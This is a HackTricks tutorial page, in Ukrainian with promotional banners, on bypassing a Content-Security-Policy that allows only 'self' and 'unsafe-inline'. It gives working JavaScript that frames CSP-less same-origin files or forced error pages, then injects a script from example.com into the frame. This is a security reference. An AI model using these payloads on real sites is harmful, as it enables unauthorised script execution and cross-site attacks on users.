{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è, —Ç–∞–∫–∞ —è–∫:
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
–ó–∞–±–æ—Ä–æ–Ω—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±—É–¥—å-—è–∫–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å –∫–æ–¥, –ø–µ—Ä–µ–¥–∞–Ω–∏–π —è–∫ —Ä—è–¥–æ–∫. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: `eval, setTimeout, setInterval` –±—É–¥—É—Ç—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ —á–µ—Ä–µ–∑ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `unsafe-eval`

–ë—É–¥—å-—è–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –¥–∂–µ—Ä–µ–ª —Ç–∞–∫–æ–∂ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ, –≤–∫–ª—é—á–∞—é—á–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, CSS, WebSockets —ñ, –æ—Å–æ–±–ª–∏–≤–æ, JS

### –ß–µ—Ä–µ–∑ —Ç–µ–∫—Å—Ç —Ç–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è

–°–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è, —â–æ —Å—É—á–∞—Å–Ω—ñ –±—Ä–∞—É–∑–µ—Ä–∏ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—Ç—å –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Ç–∞ —Ç–µ–∫—Å—Ç–∏ –≤ HTML –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è —ó—Ö –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ñ–æ–Ω—É, —Ü–µ–Ω—Ç—Ä—É–≤–∞–Ω–Ω—è —Ç–æ—â–æ). –í–Ω–∞—Å–ª—ñ–¥–æ–∫ —Ü—å–æ–≥–æ, —è–∫—â–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∞–±–æ —Ç–µ–∫—Å—Ç–æ–≤–∏–π —Ñ–∞–π–ª, —Ç–∞–∫–∏–π —è–∫ `favicon.ico` –∞–±–æ `robots.txt`, –≤—ñ–¥–∫—Ä–∏–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `iframe`, –≤—ñ–Ω –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è —è–∫ HTML. –í–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —á–∞—Å—Ç–æ –Ω–µ –º–∞—é—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ CSP —ñ –º–æ–∂—É—Ç—å –Ω–µ –º—ñ—Å—Ç–∏—Ç–∏ X-Frame-Options, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ JavaScript –∑ –Ω–∏—Ö:
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### Via Errors

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –ø–æ–º–∏–ª–∫–∞–º–∏, —Ç–∞–∫—ñ —è–∫ —Ç–µ–∫—Å—Ç–æ–≤—ñ —Ñ–∞–π–ª–∏ –∞–±–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –∑–∞–∑–≤–∏—á–∞–π –ø—Ä–∏—Ö–æ–¥—è—Ç—å –±–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ CSP —ñ –º–æ–∂—É—Ç—å –Ω–µ –º—ñ—Å—Ç–∏—Ç–∏ X-Frame-Options. –ü–æ–º–∏–ª–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–ª–∏–∫–∞–Ω—ñ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ iframe, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó:
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
–ü—ñ—Å–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –±—É–¥—å-—è–∫–æ–≥–æ –∑ –≤–∫–∞–∑–∞–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript –≤ –º–µ–∂–∞—Ö iframe –º–æ–∂–ª–∏–≤–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
